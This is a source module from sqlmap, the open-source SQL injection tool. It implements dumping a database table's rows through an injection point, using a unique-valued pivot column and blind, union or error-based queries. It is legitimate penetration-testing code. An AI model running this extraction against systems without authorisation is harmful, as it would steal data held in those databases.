#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import filterNone
from lib.core.common import getSafeExString
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import singleTimeWarnMessage
from lib.core.common import unArrayizeValue
from lib.core.common import unsafeSQLIdentificatorNaming
from lib.core.compat import xrange
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import DUMP_REPLACEMENTS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.exception import SqlmapConnectionException
from lib.core.exception import SqlmapNoneDataException
from lib.core.settings import MAX_INT
from lib.core.settings import NULL
from lib.core.settings import SINGLE_QUOTE_MARKER
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.utils.safe2bin import safechardecode
from thirdparty.six import unichr as _unichr

def pivotDumpTable(table, colList, count=None, blind=True, alias=None):
    lengths = {}
    entries = {}

    dumpNode = queries[Backend.getIdentifiedDbms()].dump_table.blind

    validColumnList = False
    validPivotValue = False

    if count is None:
        query = dumpNode.count % table
        query = agent.whereQuery(query)
        count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS) if blind else inject.getValue(query, blind=False, time=False, expected=EXPECTED.INT)

    if hasattr(count, "isdigit") and count.isdigit():
        count = int(count)

    if count == 0:
        infoMsg = "table '%s' appears to be empty" % unsafeSQLIdentificatorNaming(table)
        logger.info(infoMsg)

        for column in colList:
            lengths[column] = len(column)
            entries[column] = []

        return entries, lengths

    elif not isNumPosStrValue(count):
        return None

    for column in colList:
        lengths[column] = 0
        entries[column] = BigArray()

    colList = filterNone(sorted(colList, key=lambda x: len(x) if x else MAX_INT))

    if conf.pivotColumn:
        for _ in colList:
            if re.search(r"(.+\.)?%s" % re.escape(conf.pivotColumn), _, re.I):
                infoMsg = "using column '%s' as a pivot " % conf.pivotColumn
                infoMsg += "for retrieving row data"
                logger.info(infoMsg)

                colList.remove(_)
                colList.insert(0, _)

                validPivotValue = True
                break

        if not validPivotValue:
            warnMsg = "column '%s' not " % conf.pivotColumn
            warnMsg += "found in table '%s'" % table
            logger.warning(warnMsg)

    if not validPivotValue:
        for column in colList:
            infoMsg = "fetching number of distinct "
            infoMsg += "values for column '%s'" % column.replace(("%s." % alias) if alias else "", "")
            logger.info(infoMsg)

            query = dumpNode.count2 % (column, table)
            query = agent.whereQuery(query)
            value = inject.getValue(query, blind=blind, union=not blind, error=not blind, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if isNumPosStrValue(value):
                validColumnList = True

                if value == count:
                    infoMsg = "using column '%s' as a pivot " % column.replace(("%s." % alias) if alias else "", "")
                    infoMsg += "for retrieving row data"
                    logger.info(infoMsg)

                    validPivotValue = True
                    colList.remove(column)
                    colList.insert(0, column)
                    break

        if not validColumnList:
            errMsg = "all provided column name(s) are non-existent"
            raise SqlmapNoneDataException(errMsg)

        if not validPivotValue:
            warnMsg = "no proper pivot column provided (with unique values)."
            warnMsg += " It won't be possible to retrieve all rows"
            logger.warning(warnMsg)

    pivotValue = " "
    breakRetrieval = False

    def _(column, pivotValue):
        if column == colList[0]:
            query = dumpNode.query.replace("'%s'" if unescaper.escape(pivotValue, False) != pivotValue else "%s", "%s") % (agent.preprocessField(table, column), table, agent.preprocessField(table, column), unescaper.escape(pivotValue, False))
        else:
            query = dumpNode.query2.replace("'%s'" if unescaper.escape(pivotValue, False) != pivotValue else "%s", "%s") % (agent.preprocessField(table, column), table, agent.preprocessField(table, colList[0]), unescaper.escape(pivotValue, False) if SINGLE_QUOTE_MARKER not in dumpNode.query2 else pivotValue)

        query = agent.whereQuery(query)
        return unArrayizeValue(inject.getValue(query, blind=blind, time=blind, union=not blind, error=not blind))

    try:
        for i in xrange(count):
            if breakRetrieval:
                break

            for column in colList:
                value = _(column, pivotValue)
                if column == colList[0]:
                    if isNoneValue(value):
                        try:
                            for pivotValue in filterNone(("  " if pivotValue == " " else None, "%s%s" % (pivotValue[0], _unichr(ord(pivotValue[1]) + 1)) if len(pivotValue) > 1 else None, _unichr(ord(pivotValue[0]) + 1))):
                                value = _(column, pivotValue)
                                if not isNoneValue(value):
                                    break
                        except ValueError:
                            pass

                    if isNoneValue(value) or value == NULL:
                        breakRetrieval = True
                        break

                    pivotValue = safechardecode(value)

                if conf.limitStart or conf.limitStop:
                    if conf.limitStart and (i + 1) < conf.limitStart:
                        warnMsg = "skipping first %d pivot " % conf.limitStart
                        warnMsg += "point values"
                        singleTimeWarnMessage(warnMsg)
                        break
                    elif conf.limitStop and (i + 1) > conf.limitStop:
                        breakRetrieval = True
                        break

                value = "" if isNoneValue(value) else unArrayizeValue(value)

                lengths[column] = max(lengths[column], len(DUMP_REPLACEMENTS.get(getUnicode(value), getUnicode(value))))
                entries[column].append(value)

    except KeyboardInterrupt:
        kb.dumpKeyboardInterrupt = True

        warnMsg = "user aborted during enumeration. sqlmap "
        warnMsg += "will display partial output"
        logger.warning(warnMsg)

    except SqlmapConnectionException as ex:
        errMsg = "connection exception detected ('%s'). sqlmap " % getSafeExString(ex)
        errMsg += "will display partial output"

        logger.critical(errMsg)

    return entries, lengths
